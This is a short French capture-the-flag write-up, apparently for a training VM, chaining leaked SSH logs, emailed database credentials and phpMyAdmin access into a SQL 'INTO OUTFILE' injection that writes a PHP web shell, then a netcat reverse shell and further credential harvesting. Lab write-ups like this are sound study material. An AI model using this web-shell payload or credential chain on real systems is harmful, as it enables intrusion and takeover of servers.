# WriteUp1

- Je recupere les [logs du ssh](https://192.168.1.96/forum/index.php?id=6) sur le forum 
- `python3 ssh_parse.py`
<pre>
{'test', 'support', 'naos', 'lmezard', 'guest', 'nagios', 'ubnt', 'root', <strong>'!q\\]Ej?*5K5cy*AJ'</strong>, 'ftpuser', 'PlcmSpIp', 'adm', 'user', 'adam', 'nvdb', 'admin', 'pi'}
</pre>
- Je me connecte avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ`
- le mail est disponible dans les parametres de l'user
- Je me connecte au server imap avec `lmezard@borntosec.net` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://borntosec.net/webmail/)
- Un mail est disponible
<pre>
Hey Laurie,

You cant connect to the databases now. Use <strong>root/Fg-'kKXBj87E:aJ$</strong>

Best regards.
</pre>
- On peut donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
- En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
- J'essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
- en exutant cett commande sql je peux ecrire dans un fichier
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```
- en testant tout les dossiers du forum un est executable `/var/www/templates_c`
- Je creer donc un fichier avec un reverse shell pour que se soit plus facile et je creer un serveur en local avec netcat
- dans les home un dossier est presant LOOKATME qui contient un dossier password
```
lmezard:G!@M6f4Eatau{sF"
```
- On peut se connecter au FTP grace a ces login
- On recupere les fichiers
- On remarque que le fichier fun est une archive de plusieurs fichiers donc on le decompresse avec `tar -xf fun`


README
- Complete this little challenge and use the result as password for user 'laurie' to login in ssh
